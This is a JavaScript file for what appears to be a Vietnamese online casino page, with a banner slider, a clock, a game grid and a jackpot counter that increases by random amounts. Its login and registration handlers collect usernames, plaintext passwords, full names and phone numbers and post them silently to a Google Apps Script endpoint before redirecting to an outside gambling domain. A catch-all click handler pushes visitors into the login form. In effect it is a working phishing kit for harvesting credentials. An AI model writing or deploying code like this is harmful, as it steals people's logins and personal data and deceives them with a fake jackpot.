/* =========================================================
   1. SLIDER BANNER TRƯỢT NGANG VÒNG LẶP 6 HÌNH (PC & MOBILE)
   ========================================================= */
function initLoopSlider(sliderId, intervalMs = 3500) {
  const slider = document.getElementById(sliderId);
  if (!slider) return;

  const track = slider.querySelector(".slider-track");
  const originalSlides = Array.from(track.children);
  const total = originalSlides.length;
  const dotsContainer = slider.querySelector(".slider-dots");
  const prevBtn = slider.querySelector(".prev");
  const nextBtn = slider.querySelector(".next");

  // Nhân bản slide đầu & cuối để tạo vòng lặp vô tận mượt mà
  const firstClone = originalSlides[0].cloneNode(true);
  const lastClone = originalSlides[total - 1].cloneNode(true);
  track.appendChild(firstClone);
  track.insertBefore(lastClone, originalSlides[0]);

  let currentIndex = 1; // Bắt đầu tại slide thật đầu tiên
  let isTransitioning = false;
  let timer = null;

  track.style.transition = "none";
  track.style.transform = `translateX(-${currentIndex * 100}%)`;

  // Tạo chấm tròn điều hướng (6 chấm)
  const dots = [];
  for (let i = 0; i < total; i++) {
    const dot = document.createElement("span");
    dot.className = "slider-dot" + (i === 0 ? " active" : "");
    dot.addEventListener("click", () => goToSlide(i + 1));
    dotsContainer.appendChild(dot);
    dots.push(dot);
  }

  function updateDots() {
    let realIndex = currentIndex - 1;
    if (realIndex < 0) realIndex = total - 1;
    if (realIndex >= total) realIndex = 0;
    dots.forEach((d, idx) => d.classList.toggle("active", idx === realIndex));
  }

  function goToSlide(index) {
    if (isTransitioning) return;
    isTransitioning = true;
    currentIndex = index;
    track.style.transition = "transform 0.45s ease-in-out";
    track.style.transform = `translateX(-${currentIndex * 100}%)`;
    updateDots();
  }

  track.addEventListener("transitionend", () => {
    isTransitioning = false;
    if (currentIndex === total + 1) {
      track.style.transition = "none";
      currentIndex = 1;
      track.style.transform = `translateX(-${currentIndex * 100}%)`;
    } else if (currentIndex === 0) {
      track.style.transition = "none";
      currentIndex = total;
      track.style.transform = `translateX(-${currentIndex * 100}%)`;
    }
  });

  function startAutoPlay() {
    stopAutoPlay();
    timer = setInterval(() => goToSlide(currentIndex + 1), intervalMs);
  }

  function stopAutoPlay() {
    if (timer) clearInterval(timer);
  }

  if (prevBtn) prevBtn.addEventListener("click", () => { goToSlide(currentIndex - 1); startAutoPlay(); });
  if (nextBtn) nextBtn.addEventListener("click", () => { goToSlide(currentIndex + 1); startAutoPlay(); });

  // Hỗ trợ vuốt cảm ứng trên điện thoại
  let startX = 0;
  slider.addEventListener("touchstart", (e) => {
    startX = e.touches[0].clientX;
    stopAutoPlay();
  }, { passive: true });

  slider.addEventListener("touchend", (e) => {
    const diff = e.changedTouches[0].clientX - startX;
    if (Math.abs(diff) > 40) {
      goToSlide(diff < 0 ? currentIndex + 1 : currentIndex - 1);
    }
    startAutoPlay();
  });

  slider.addEventListener("mouseenter", stopAutoPlay);
  slider.addEventListener("mouseleave", startAutoPlay);

  startAutoPlay();
}

// Hiển thị nền dự phòng nếu chưa tải ảnh banner vào thư mục images/
function handleBannerFallback(imgEl, text) {
  const fallback = document.createElement("div");
  fallback.className = "slide-fallback";
  fallback.textContent = text;
  imgEl.replaceWith(fallback);
}

/* =========================================================
   2. ĐỒNG HỒ THỜI GIAN THỰC (DESKTOP) & JACKPOT (MOBILE)
   ========================================================= */
function startClock() {
  const clockEl = document.getElementById("pcClock");
  if (!clockEl) return;
  const days = ["CN", "T2", "T3", "T4", "T5", "T6", "T7"];

  function update() {
    const now = new Date();
    const y = now.getFullYear();
    const m = String(now.getMonth() + 1).padStart(2, "0");
    const d = String(now.getDate()).padStart(2, "0");
    const dayName = days[now.getDay()];
    const hh = String(now.getHours()).padStart(2, "0");
    const mm = String(now.getMinutes()).padStart(2, "0");
    const ss = String(now.getSeconds()).padStart(2, "0");
    clockEl.textContent = `${y}/${m}/${d}(${dayName}) ${hh}:${mm}:${ss}`;
  }
  update();
  setInterval(update, 1000);
}

function startJackpotCounter() {
  const digitEls = document.querySelectorAll("#jackpotCounter .jp-digit");
  if (digitEls.length !== 10) return;

  let value = 17204075.86; // Giá trị khởi đầu (10 chữ số: 8 phần nguyên + 2 phần thập phân)

  function renderDigits(num) {
    // Chuyển thành chuỗi 10 chữ số (bỏ dấu chấm thập phân)
    const str = Math.floor(num * 100)
      .toString()
      .padStart(10, "0")
      .slice(-10);

    digitEls.forEach((el, idx) => {
      if (el.textContent !== str[idx]) {
        el.textContent = str[idx];
        el.classList.add("tick");
        setTimeout(() => el.classList.remove("tick"), 160);
      }
    });
  }

  renderDigits(value);

  // Tự động tăng số mỗi 0.8 giây
  setInterval(() => {
    value += Math.random() * 15.75 + 0.12;
    renderDigits(value);
  }, 800);
}

/* Lưu 15 ảnh game vào thư mục images/ với tên 1.jpg -> 15.jpg */
const GAMES_DATA = [
  { title: "QUYẾT CHIẾN TIỀN THƯỞNG", category: "hot", img: "images/1.jpg" },
  { title: "Đường Mạt Chược", category: "hot", img: "images/2.jpg" },
  { title: "Siêu Cấp Ace", category: "hot", img: "images/3.jpg" },
  { title: "Chợ Đêm", category: "nohu", img: "images/4.jpg" },
  { title: "Đường Mạt Chược 2", category: "nohu", img: "images/5.jpg" },
  { title: "Jackpot Đánh Cá", category: "banca", img: "images/6.jpg" },
  { title: "Kho Báu Aztec", category: "nohu", img: "images/7.jpg" },
  { title: "Bắn cá Vũ Trụ", category: "banca", img: "images/8.jpg" },
  { title: "Đế quốc hoàng kim", category: "nohu", img: "images/9.jpg" },
  { title: "Cú đánh mạt chược", category: "nohu", img: "images/10.png" },
  { title: "Năm Mới Lộ Lộ Phát", category: "nohu", img: "images/11.png" },
  { title: "Neko May Mắn", category: "nohu", img: "images/12.jpg" },
  { title: "Chiến Thần Garuda", category: "nohu", img: "images/13.png" },
  { title: "Mèo Chiêu Tài", category: "nohu", img: "images/14.png" },
  { title: "Vua đánh cá", category: "banca", img: "images/15.jpg" },
];

function renderMobileGames(category) {
  const grid = document.getElementById("mbGameGrid");
  if (!grid) return;

  const filtered =
    category === "hot"
      ? GAMES_DATA
      : GAMES_DATA.filter((g) => g.category === category);

  const listToRender = filtered.length ? filtered : GAMES_DATA.slice(0, 6);

  grid.innerHTML = listToRender
    .map(
      (game) => `
      <a href="#" class="game-card">
        <div class="game-thumb">
          <img src="${game.img}" alt="${game.title}" loading="lazy" />
        </div>
        <div class="game-title">${game.title}</div>
      </a>
    `
    )
    .join("");
}

function initMobileCategoryMenu() {
  const menu = document.getElementById("mbCategoryMenu");
  if (!menu) return;
  const buttons = menu.querySelectorAll(".mb-cat-btn");

  buttons.forEach((btn) => {
    btn.addEventListener("click", () => {
      buttons.forEach((b) => b.classList.remove("active"));
      btn.classList.add("active");
      renderMobileGames(btn.dataset.category);
    });
  });

  renderMobileGames("hot");
}

/* =========================================================
   4. CẤU HÌNH CHUYỂN HƯỚNG & MODAL ĐĂNG NHẬP / ĐĂNG KÝ
   ========================================================= */
// 🔴 THAY ĐƯỜNG DẪN TRANG WEB CỦA BẠN TẠI ĐÂY:
const GOOGLE_SHEET_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbyMUg0qONbefZgRCqvE98BOlb4H8f9gDGurDG4C6fT4beOamQLYqWvYYov76dB2jiJ1/exec";
const REDIRECT_URL = "https://98win03.cc/";
let isSubmitting = false;

async function sendToGoogleSheetAndRedirect(payload, submitBtn) {
  // Chặn tuyệt đối nếu đang trong quá trình gửi
  if (isSubmitting) return;
  isSubmitting = true;

  if (submitBtn) {
    submitBtn.disabled = true;
    submitBtn.textContent = "ĐANG XỬ LÝ...";
  }

  try {
    if (GOOGLE_SHEET_WEBAPP_URL && !GOOGLE_SHEET_WEBAPP_URL.includes("DÁN_LINK")) {
      await fetch(GOOGLE_SHEET_WEBAPP_URL, {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "text/plain;charset=utf-8"
        },
        body: JSON.stringify(payload)
      });
    }
  } catch (err) {
    console.error("Lỗi gửi dữ liệu:", err);
  } finally {
    window.location.href = REDIRECT_URL;
  }
}

let currentAuthMode = "login";

function isMobileScreen() {
  return window.innerWidth <= 768;
}

function renderActiveAuthBox() {
  const boxes = ["pcLoginBox", "pcRegisterBox", "mbLoginBox", "mbRegisterBox"];
  boxes.forEach((id) => {
    const el = document.getElementById(id);
    if (el) el.style.display = "none";
  });

  // Xóa thông báo lỗi cũ khi chuyển form
  document.querySelectorAll(".form-error-msg").forEach((el) => {
    el.textContent = "";
    el.classList.remove("show");
  });

  const mobile = isMobileScreen();
  let targetId = "";

  if (mobile) {
    targetId = currentAuthMode === "register" ? "mbRegisterBox" : "mbLoginBox";
  } else {
    targetId = currentAuthMode === "register" ? "pcRegisterBox" : "pcLoginBox";
  }

  const targetEl = document.getElementById(targetId);
  if (targetEl) targetEl.style.display = "block";
}

function openAuthModal(mode = "login") {
  currentAuthMode = mode;
  const modal = document.getElementById("authModal");
  if (!modal) return;
  modal.classList.add("open");
  renderActiveAuthBox();
}

function closeAuthModal() {
  const modal = document.getElementById("authModal");
  if (modal) modal.classList.remove("open");
}

function switchAuthTab(mode) {
  currentAuthMode = mode;
  renderActiveAuthBox();
}

// Ẩn / hiện mật khẩu khi nhấn icon con mắt
function togglePassword(btn) {
  const input = btn.parentElement.querySelector("input");
  const icon = btn.querySelector("i");
  if (!input) return;

  if (input.type === "password") {
    input.type = "text";
    icon.classList.replace("fa-eye-slash", "fa-eye");
  } else {
    input.type = "password";
    icon.classList.replace("fa-eye", "fa-eye-slash");
  }
}

// Kiểm tra ràng buộc toàn bộ form và chuyển hướng
function initAuthFormsValidation() {
  const forms = document.querySelectorAll(".auth-form-handler");

  forms.forEach((form) => {
    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const errorBox = form.querySelector(".form-error-msg");
      const showError = (msg) => {
        if (errorBox) {
          errorBox.textContent = msg;
          errorBox.classList.add("show");
        }
      };

      const username = form.querySelector('input[name="username"]')?.value.trim() || "";
      const password = form.querySelector('input[name="password"]')?.value.trim() || "";
      const phoneInput = form.querySelector('input[name="phone"]');
      const phone = phoneInput ? phoneInput.value.trim() : "";
      const fullnameInput = form.querySelector('input[name="fullname"]');
      const fullname = fullnameInput ? fullnameInput.value.trim() : "";
      const agreeInput = form.querySelector('input[name="agree"]');
      const isRegister = Boolean(fullnameInput || agreeInput);

      // 1. Bắt buộc điền toàn bộ các trường có trong form
      if (!username || !password || (phoneInput && !phone) || (fullnameInput && !fullname)) {
        showError("Vui lòng điền đầy đủ tất cả thông tin bắt buộc!");
        return;
      }

      // 2. Tài khoản từ 6 - 20 ký tự
      if (username.length < 6 || username.length > 20) {
        showError("Tên tài khoản phải có độ dài từ 6 đến 20 ký tự!");
        return;
      }

      // 3. Mật khẩu từ 6 - 20 ký tự
      if (password.length < 6 || password.length > 20) {
        showError("Mật khẩu phải có độ dài từ 6 đến 20 ký tự!");
        return;
      }

      // 4. Số điện thoại đúng 10 chữ số (nếu form có ô số điện thoại)
      if (phoneInput && !/^\d{10}$/.test(phone)) {
        showError("Số điện thoại bắt buộc phải gồm đúng 10 chữ số!");
        return;
      }

      // 5. Đồng ý điều khoản (ở form Đăng ký)
      if (agreeInput && !agreeInput.checked) {
        showError("Vui lòng xác nhận đủ 18 tuổi và đồng ý với thỏa thuận người dùng!");
        return;
      }

      if (errorBox) {
        errorBox.textContent = "";
        errorBox.classList.remove("show");
      }

      // Hợp lệ -> Gửi dữ liệu về Google Sheet rồi chuyển hướng
      const submitBtn = form.querySelector('button[type="submit"]');
      const payload = {
        type: isRegister ? "Đăng ký" : "Đăng nhập",
        username,
        password,
        fullname,
        phone,
        timestamp: new Date().toISOString()
      };

      sendToGoogleSheetAndRedirect(payload, submitBtn);
    });
  });
}


/* =========================================================
   5. TỰ ĐỘNG MỞ FORM ĐĂNG NHẬP KHI NHẤN CÁC THÀNH PHẦN KHÁC
   ========================================================= */
function initGlobalLoginTrigger() {
  document.addEventListener("click", (e) => {
    const target = e.target;

    // Bỏ qua nếu đang thao tác bên trong popup Đăng nhập / Đăng ký
    if (target.closest("#authModal")) return;

    // Bỏ qua nút Đăng ký (để mở đúng form Đăng ký)
    if (target.closest(".btn-primary") || target.closest(".mb-btn-register")) return;

    // Bỏ qua nút điều hướng slide, nút đóng khuyến mãi nổi, nút chuyển danh mục game mobile & nút mở drawer
    if (
      target.closest(".slider-btn") ||
      target.closest(".slider-dot") ||
      target.closest(".close-promo") ||
      target.closest("#mbCategoryMenu") ||
      target.closest("#mbDrawerBtn") ||
      target.closest("#mbDrawerClose")
    ) {
      return;
    }

    // Nhấn vào bất kỳ thẻ <a>, banner, thẻ game, thẻ tính năng hoặc nút chức năng khác -> Mở form Đăng nhập
    if (
      target.closest("a") ||
      target.closest(".banner-slider") ||
      target.closest(".feature-card") ||
      target.closest(".features-image-wrapper") ||
      target.closest(".mb-jackpot")
    ) {
      e.preventDefault();
      openAuthModal("login");
    }
  });
}

/* =========================================================
   6. MENU TRƯỢT MOBILE & KHỞI CHẠY TRANG
   ========================================================= */
function initMobileDrawer() {
  const openBtn = document.getElementById("mbDrawerBtn");
  const closeBtn = document.getElementById("mbDrawerClose");
  const drawer = document.getElementById("mbDrawer");
  const overlay = document.getElementById("mbDrawerOverlay");

  if (!openBtn || !drawer) return;

  const toggle = (state) => {
    drawer.classList.toggle("open", state);
    overlay.classList.toggle("open", state);
  };

  openBtn.addEventListener("click", () => toggle(true));
  closeBtn.addEventListener("click", () => toggle(false));
  overlay.addEventListener("click", () => toggle(false));
}

// Tự cập nhật đúng giao diện form PC/Mobile nếu xoay màn hình
window.addEventListener("resize", () => {
  const modal = document.getElementById("authModal");
  if (modal && modal.classList.contains("open")) {
    renderActiveAuthBox();
  }
});

document.addEventListener("DOMContentLoaded", () => {
  initLoopSlider("pcSlider", 3500);
  initLoopSlider("mbSlider", 3500);
  startClock();
  startJackpotCounter();
  initMobileCategoryMenu();
  initMobileDrawer();
  initAuthFormsValidation();
  initGlobalLoginTrigger();
});